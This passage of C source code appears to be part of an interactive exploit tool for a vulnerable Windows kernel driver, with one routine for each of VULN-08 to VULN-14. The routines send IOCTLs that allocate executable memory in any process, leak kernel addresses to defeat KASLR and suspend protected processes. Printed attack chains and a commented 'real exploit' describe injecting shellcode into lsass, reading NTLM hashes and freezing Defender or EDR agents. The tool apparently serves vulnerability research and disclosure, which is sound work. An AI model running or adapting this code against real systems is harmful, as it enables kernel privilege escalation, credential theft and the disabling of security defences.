    printf("  [*] This IOCTL allows injecting a kernel APC into any thread.\n");
    printf("  [*] The APC normal routine (sub_1400057B0) executes user-supplied\n");
    printf("  [*] code address in the context of the target process.\n\n");

    printf("  [*] Attack chain:\n");
    printf("      1. Find target thread TID (e.g., lsass.exe main thread)\n");
    printf("      2. Allocate executable memory in target via VULN-09\n");
    printf("      3. Write shellcode via process memory write IOCTL\n");
    printf("      4. Queue APC pointing to shellcode\n");
    printf("      5. Code executes in target's context with its privileges\n\n");

    printf("  [!] Demonstration SKIPPED (would inject code into process).\n");
}


/*
 * VULN-09: Allocate Virtual Memory in Any Process
 *
 * Case 0x7C: KeAttachProcess + ZwAllocateVirtualMemory in target context.
 * AllocationType and Protection flags are fully user-controlled.
 *
 * Impact: Allocate PAGE_EXECUTE_READWRITE in any process for code injection
 */
static void Exploit_AllocVM(void)
{
    ALLOC_VM req;
    DWORD br;
    BOOL ok;

    printf("\n  [VULN-09] Allocate Virtual Memory in Any Process\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0x7C)\n", IOCTL_CE_ALLOCVM);
    printf("  [*] Calls: KeAttachProcess + ZwAllocateVirtualMemory\n\n");

    /* Demo: allocate in our own process */
    memset(&req, 0, sizeof(req));
    req.ProcessId = GetCurrentProcessId();
    req.BaseAddress = 0;
    req.Size = 0x1000;
    req.AllocationType = 0x3000;  /* MEM_COMMIT | MEM_RESERVE */
    req.Protection = 0x40;        /* PAGE_EXECUTE_READWRITE */

    printf("  [*] Target PID: %lu (self for safe demo)\n", (DWORD)req.ProcessId);
    printf("  [*] Size: 0x%llX\n", req.Size);
    printf("  [*] Protection: PAGE_EXECUTE_READWRITE (0x40)\n\n");

    ok = SendIoctl(IOCTL_CE_ALLOCVM, &req, sizeof(req),
                   &req, sizeof(req), &br);

    if (ok && req.BaseAddress)
    {
        printf("  [+] Allocated at: 0x%016llX\n", req.BaseAddress);
        printf("  [+] PAGE_EXECUTE_READWRITE memory allocated via kernel!\n\n");

        printf("  [*] In a real attack, the target PID would be a different process\n");
        printf("  [*] (e.g., winlogon.exe), and shellcode would be written there.\n");
    }
    else
    {
        printf("  [-] Allocation failed: %lu\n", GetLastError());
    }
}


/*
 * VULN-10: Cross-Process Memory Mapping via MDL
 *
 * Case 0x30 (switch 2): IoAllocateMdl + MmProbeAndLockPages in source process,
 * then MmMapLockedPagesSpecifyCache in target process. Full cross-process
 * memory mapping with no restrictions.
 *
 * Impact: Map kernel/process memory into attacker-controlled process
 */
static void Exploit_MDLCrossMap(void)
{
    MDL_MAP req;

    printf("\n  [VULN-10] Cross-Process Memory Mapping via MDL\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0x30 in switch 2)\n", IOCTL_CE_MDLMAP);
    printf("  [*] Calls: IoAllocateMdl + MmProbeAndLockPages + MmMapLockedPages\n\n");

    printf("  [*] This allows mapping memory from process A into process B.\n");
    printf("  [*] If SourceProcessId == 0, maps KERNEL memory into userland!\n\n");

    printf("  [*] Attack scenarios:\n");
    printf("      1. Map lsass.exe memory -> read NTLM hashes directly\n");
    printf("      2. Map kernel pool -> read/write kernel data from usermode\n");
    printf("      3. Map another process's code -> patch without injection\n\n");

    printf("  [!] Demonstration SKIPPED (requires valid virtual addresses).\n");

    /*
     * Real exploit:
     *
     * memset(&req, 0, sizeof(req));
     * req.SourceProcessId = lsass_pid;
     * req.TargetProcessId = GetCurrentProcessId();
     * req.SourceAddress = lsass_heap_address;
     * req.Size = 0x10000;
     * SendIoctl(IOCTL_CE_MDLMAP, &req, sizeof(req), &req, sizeof(req), &br);
     * // req.MappedAddress now points to lsass memory in our process!
     */
}


/*
 * VULN-11: EPROCESS Kernel Pointer Leak
 *
 * Case 0x14: PsLookupProcessByProcessId returns EPROCESS pointer,
 * which is sent directly back to userland.
 *
 * Impact: KASLR bypass, enables offset calculations for kernel exploits
 */
static void Exploit_EprocessLeak(void)
{
    EPROCESS_LEAK req;
    DWORD br;
    BOOL ok;

    printf("\n  [VULN-11] EPROCESS Kernel Pointer Leak\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0x14)\n", IOCTL_CE_GETPEPROCESS);
    printf("  [*] Calls: PsLookupProcessByProcessId -> returns EPROCESS to user\n\n");

    /* Leak EPROCESS of System process (PID 4) */
    memset(&req, 0, sizeof(req));
    req.ProcessId = 4;

    ok = SendIoctl(IOCTL_CE_GETPEPROCESS, &req, sizeof(req),
                   &req, sizeof(req), &br);

    if (ok && req.EprocessAddress)
    {
        printf("  [+] PID 4 (System) EPROCESS: 0x%016llX\n", req.EprocessAddress);
    }

    /* Leak EPROCESS of current process */
    req.ProcessId = GetCurrentProcessId();
    req.EprocessAddress = 0;

    ok = SendIoctl(IOCTL_CE_GETPEPROCESS, &req, sizeof(req),
                   &req, sizeof(req), &br);

    if (ok && req.EprocessAddress)
    {
        printf("  [+] PID %lu (self) EPROCESS: 0x%016llX\n",
               req.ProcessId, req.EprocessAddress);
        printf("\n  [+] KASLR defeated — kernel object addresses leaked!\n\n");

        printf("  [*] With EPROCESS address, an attacker can:\n");
        printf("      - Calculate Token offset to steal SYSTEM token\n");
        printf("      - Walk ActiveProcessLinks to find any process\n");
        printf("      - Use with VULN-01 to write directly to kernel structures\n");
    }
    else
    {
        printf("  [-] EPROCESS leak failed: %lu\n", GetLastError());
    }
}


/*
 * VULN-12: Kernel Routine Address Resolution
 *
 * Case 0x9C: Calls MmGetSystemRoutineAddress with user-supplied function name.
 * Returns the kernel virtual address of any exported kernel function.
 *
 * Impact: Full KASLR bypass, enables ROP/JOP chain construction
 */
static void Exploit_ResolveKernelAddr(void)
{
    SYSROUTINE req;
    DWORD br;
    BOOL ok;
    const wchar_t* targets[] = {
        L"NtOpenProcess",
        L"ExAllocatePool",
        L"PsLookupProcessByProcessId",
        L"MmCopyVirtualMemory",
        L"IoGetCurrentProcess",
        NULL
    };
    int i;

    printf("\n  [VULN-12] Kernel Routine Address Resolution\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0x9C)\n", IOCTL_CE_GETSYSROUTINE);
    printf("  [*] Calls: MmGetSystemRoutineAddress(user_name)\n\n");

    for (i = 0; targets[i] != NULL; i++)
    {
        memset(&req, 0, sizeof(req));
        wcscpy_s(req.RoutineName, 128, targets[i]);

        ok = SendIoctl(IOCTL_CE_GETSYSROUTINE, &req, sizeof(req),
                       &req, sizeof(req), &br);

        if (ok)
        {
            wprintf(L"  [+] %-35s = 0x%016llX\n", targets[i], req.Address);
        }
        else
        {
            wprintf(L"  [-] %-35s FAILED\n", targets[i]);
        }
    }

    printf("\n  [+] KASLR completely defeated — can resolve ANY kernel function!\n");
    printf("  [*] This enables building ROP chains for arbitrary kernel execution.\n");
}


/*
 * VULN-13: Kill/Suspend/Resume Any Process (including PPL)
 *
 * Cases 0x90/0x94: Calls PsSuspendProcess / PsResumeProcess (undocumented)
 * on any process by PID. These functions bypass PPL protections.
 *
 * Impact: Kill/freeze antivirus, EDR, anti-cheat, critical system processes
 */
static void Exploit_KillProcess(void)
{
    PROC_CONTROL req;
    DWORD br;
    BOOL ok;
    DWORD targetPid;
    char targetName[256];

    printf("\n  [VULN-13] Suspend/Resume Any Process (PPL Bypass)\n");
    PrintSeparator();
    printf("  [*] Suspend IOCTL: 0x%08X (case 0x90)\n", IOCTL_CE_SUSPENDPROC);
    printf("  [*] Resume  IOCTL: 0x%08X (case 0x94)\n", IOCTL_CE_RESUMEPROC);
    printf("  [*] Calls: PsSuspendProcess / PsResumeProcess (undocumented)\n\n");

    printf("  [*] Enter process name to suspend (e.g., notepad.exe): ");
    if (!fgets(targetName, sizeof(targetName), stdin))
    {
        printf("  [!] Invalid input.\n");
        return;
    }
    /* Remove newline */
    targetName[strcspn(targetName, "\r\n")] = 0;

    if (strlen(targetName) == 0)
    {
        printf("  [!] No process specified, using notepad.exe as example\n");
        strcpy_s(targetName, sizeof(targetName), "notepad.exe");
    }

    targetPid = FindProcessByName(targetName);
    if (!targetPid)
    {
        printf("  [!] Process '%s' not found. Launch it first.\n", targetName);
        return;
    }

    printf("  [*] Found '%s' at PID %lu\n", targetName, targetPid);
    printf("  [*] Suspending...\n");

    memset(&req, 0, sizeof(req));
    req.ProcessId = targetPid;

    ok = SendIoctl(IOCTL_CE_SUSPENDPROC, &req, sizeof(req),
                   &req, sizeof(req), &br);

    if (ok)
    {
        printf("  [+] Process SUSPENDED via PsSuspendProcess!\n");
        printf("  [*] The process is now frozen. Press Enter to resume...\n");
        getchar();

        ok = SendIoctl(IOCTL_CE_RESUMEPROC, &req, sizeof(req),
                       &req, sizeof(req), &br);

        if (ok)
            printf("  [+] Process RESUMED via PsResumeProcess!\n");
        else
            printf("  [-] Resume failed: %lu\n", GetLastError());
    }
    else
    {
        printf("  [-] Suspend failed: %lu (PsSuspendProcess may not be resolved)\n",
               GetLastError());
    }

    printf("\n  [*] In a real attack, this would target:\n");
    printf("      - MsMpEng.exe (Windows Defender)\n");
    printf("      - Any EDR agent process\n");
    printf("      - csrss.exe (causes BSOD if terminated)\n");
}


/*
 * VULN-14: ObRegisterCallbacks with Predictable Altitude
 *
 * Case 0x6C (switch 2): Registers OB callbacks for process/thread open
 * operations. Altitude is derived from system time, making it predictable.
 *
 * Impact: Intercept/block process handle creation for defense evasion
 */
static void Exploit_ObCallbacks(void)
{
    printf("\n  [VULN-14] ObRegisterCallbacks with Predictable Altitude\n");
    PrintSeparator();
    printf("  [*] IOCTL: 0x%08X (case 0x6C in switch 2)\n", IOCTL_CE_OBCALLBACK);
    printf("  [*] Calls: ObRegisterCallbacks (Process + Thread types)\n\n");

    printf("  [*] The callback registration uses an altitude derived from:\n");
    printf("      MEMORY[0xFFFFF78000000320] %% 50000 + 1000\n");
    printf("  [*] SharedUserData->InterruptTime is predictable.\n\n");

    printf("  [*] Once registered, the callbacks can:\n");
    printf("      - Strip PROCESS_VM_READ/WRITE from handles\n");
    printf("      - Block debugger access to protected process\n");
    printf("      - Hide malicious processes from security tools\n\n");

    printf("  [!] Demonstration SKIPPED (would modify system callback list).\n");
}


/* ======================== BONUS: Driver Version Check ==================== */

static BOOL CheckDriverVersion(void)
{
    DRIVER_VERSION req;
    DWORD br;
    BOOL ok;

    memset(&req, 0, sizeof(req));

    ok = SendIoctl(IOCTL_CE_GETVERSION, &req, sizeof(req),
                   &req, sizeof(req), &br);

    if (ok)
    {
        printf("  [+] Driver version: %u\n", req.Version);
        return TRUE;
    }

    printf("  [-] Version check failed: %lu\n", GetLastError());
    return FALSE;
}


/* ======================== MENU AND MAIN ================================== */

static void PrintMenu(void)
{
    printf("\n");
    PrintSeparator();
    printf("  SELECT VULNERABILITY TO EXPLOIT:\n");
    PrintSeparator();
    printf("\n");
    printf("  [CRITICAL]\n");
    printf("    1.  VULN-01: Arbitrary Physical Memory Write\n");
    printf("    2.  VULN-02: Arbitrary MSR Read/Write\n");
    printf("    3.  VULN-03: Arbitrary Kernel Function Call\n");
    printf("   10.  VULN-10: Cross-Process MDL Mapping\n");
    printf("\n");
    printf("  [HIGH]\n");
    printf("    4.  VULN-04: NonPaged Pool Alloc + Kernel Addr Leak\n");
    printf("    5.  VULN-05: Arbitrary Kernel Pool Free\n");
    printf("    6.  VULN-06: Open Process (PROCESS_ALL_ACCESS)\n");
    printf("    7.  VULN-07: Open Thread (THREAD_ALL_ACCESS)\n");
    printf("    8.  VULN-08: Kernel APC Injection\n");
    printf("    9.  VULN-09: Allocate VM in Any Process\n");
    printf("   13.  VULN-13: Kill/Suspend Any Process (PPL Bypass)\n");
    printf("\n");
    printf("  [MEDIUM]\n");
    printf("   11.  VULN-11: EPROCESS Kernel Pointer Leak\n");
    printf("   12.  VULN-12: Kernel Routine Address Resolution\n");
    printf("   14.  VULN-14: ObRegisterCallbacks Bypass\n");
    printf("\n");
    printf("  [OTHER]\n");
    printf("    0.  Run ALL safe demonstrations\n");
    printf("   99.  Exit\n");
    printf("\n");
    printf("  Choice: ");
}

static void RunAllSafe(void)
{
    printf("\n\n  ========== RUNNING ALL SAFE DEMONSTRATIONS ==========\n");

    Exploit_MSR_ReadWrite();
    Exploit_PoolAllocLeak();
    Exploit_OpenProcessFull();
    Exploit_OpenThreadFull();
    Exploit_EprocessLeak();
    Exploit_ResolveKernelAddr();

    printf("\n\n  ========== SAFE DEMONSTRATIONS COMPLETE ==========\n");
    printf("  [*] 6 of 14 exploits demonstrated live (read-only / self-target).\n");
    printf("  [*] 8 remaining require destructive actions (skipped for safety).\n");
}


int main(int argc, char** argv)
{
    int choice;

    PrintBanner();

    /* Step 1: Enable SeDebugPrivilege */
    printf("  [*] Step 1: Enabling SeDebugPrivilege...\n");
    if (!EnableDebugPrivilege())
    {
        printf("  [!] Cannot continue without SeDebugPrivilege.\n");
        printf("  [!] Please run as Administrator.\n");
        return 1;
    }

    /* Step 2: Open driver device */
    printf("  [*] Step 2: Opening driver device...\n");
    g_hDevice = OpenDriverDevice();
    if (g_hDevice == INVALID_HANDLE_VALUE)
    {
        printf("  [!] Cannot continue without driver access.\n");
        return 1;
    }

    /* Step 3: Verify driver version */
    printf("  [*] Step 3: Checking driver version...\n");
    CheckDriverVersion();

    printf("\n  [+] Initialization complete. Ready to exploit.\n");

    /* Main menu loop */
    while (1)
    {
        PrintMenu();

        if (scanf_s("%d", &choice) != 1)
        {
            /* Clear invalid input */
            while (getchar() != '\n');
            continue;
        }
        /* Consume newline */
        while (getchar() != '\n');

        switch (choice)
        {
            case 0:  RunAllSafe();                break;
            case 1:  Exploit_PhysMemWrite();      break;
            case 2:  Exploit_MSR_ReadWrite();      break;
            case 3:  Exploit_ArbitraryKernelCall(); break;
            case 4:  Exploit_PoolAllocLeak();      break;
            case 5:  Exploit_ArbitraryPoolFree();  break;
            case 6:  Exploit_OpenProcessFull();    break;
            case 7:  Exploit_OpenThreadFull();     break;
            case 8:  Exploit_APCInjection();       break;
            case 9:  Exploit_AllocVM();            break;
            case 10: Exploit_MDLCrossMap();        break;
            case 11: Exploit_EprocessLeak();       break;
            case 12: Exploit_ResolveKernelAddr();  break;
            case 13: Exploit_KillProcess();        break;
            case 14: Exploit_ObCallbacks();        break;
            case 99:
                printf("\n  [*] Exiting. Stay ethical!\n\n");
                CloseHandle(g_hDevice);
                return 0;
            default:
                printf("  [!] Invalid choice.\n");
                break;
        }
    }

    CloseHandle(g_hDevice);
    return 0;
}

```